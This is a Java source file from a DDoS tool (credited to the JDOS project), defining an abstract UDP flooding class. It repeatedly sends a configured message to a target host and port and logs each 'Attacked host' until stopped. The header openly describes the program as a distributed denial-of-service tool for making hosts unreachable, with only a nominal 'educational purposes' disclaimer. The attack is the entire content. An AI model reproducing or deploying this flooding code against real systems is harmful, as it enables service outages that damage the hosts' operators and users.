/*
 * This program was written by Tobias Schmidradler (schmidi000)
 * and published under the MIT License.
 * 
 * What kind of program is this?
 * This is a program for performing a Distributed Denial of Serivce (DDOS).
 * With a DDOS you could make a host in the network unreachable.
 *
 * 
 * All rights are reserved.
 * 
 * NOTE: 
 * ------------------------------------------------------------------------------------------
 * This program is only for educational purposes!
 * You use this on your own risk. 
 * Distributed Denial of Service attacks are illegal, you could go to jail for this.
 * ------------------------------------------------------------------------------------------
 * 
 * I am liable for nothing!
 *
 * Link: https://github.com/schmidi000/JDOS
 * E-Mail: tobias.schmidradler@gmail.com
 * Website: www.straim.com
 * Copyright (c) 2015
 */
package gq.glowman554.modules.impl.ddos.protocols.interfaces;

import gq.glowman554.modules.impl.ddos.DDOSPattern;
import gq.glowman554.modules.impl.ddos.DDOSer;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

/**
 * This is the UDP implementation of the DDOS.
 * 
 * @author Tobias
 * 
 * Last changed: 13.05.2015
 */
public abstract class UDP extends DDOS {
    private DatagramSocket socket;
    private DatagramPacket packet;

    /**
     * Constructor.
     * Create a UDP DDOS with a specified DDOS Pattern.
     * @param ddosPattern 
     */
    public UDP(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
    /**
     * This is the "main" method.
     * The whole action happens here:
     *  - Open the socket
     *  - Connect the socket
     *  - Write something to the socket
     *  - Close the socket
     */
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && !socket.isClosed() && DDOSer.stopThread != true) {
            writeLineToSocket(getDdosPattern().getMessage());
            DDOSer.appendToConsole("Attacked host "+getDdosPattern().getHost()+":"+getDdosPattern().getPort());
            try {
                Thread.sleep(getDdosPattern().getTimeout());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        closeSocket();
    }
    
    /**
     * Create the socket
     */
    protected void createSocket() {
        try {
            socket = new DatagramSocket(0);
            socket.setSoTimeout(getDdosPattern().getSocketTimeout());
        } catch (SocketException ex) {
            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
            ex.printStackTrace();
        }
    }
    
    /**
     * This method writes something (Protocol dependent) to the socket.
     * @param message 
     */
    public abstract void writeLineToSocket(String message);
    
    /**
     * Connect to the socket.
     */
    protected void connectToSocket() {
        setAddress(new InetSocketAddress(getDdosPattern().getHost(),getDdosPattern().getPort()));
        packet = new DatagramPacket(new byte[1],1,getAddress());
    }
    
    /**
     * Close the socket
     */
    protected void closeSocket() {
        if(socket != null && !socket.isClosed() && socket.isBound()) {
            socket.close();
        }
    }

    /**
     * Get the Socket
     * @return 
     */
    public DatagramSocket getSocket() {
        return socket;
    }

    /**
     * Set the socket
     * @param socket 
     */
    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

    /**
     * Get the packet
     * @return 
     */
    public DatagramPacket getPacket() {
        return packet;
    }

    /**
     * Set the packet
     * @param packet 
     */
    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}
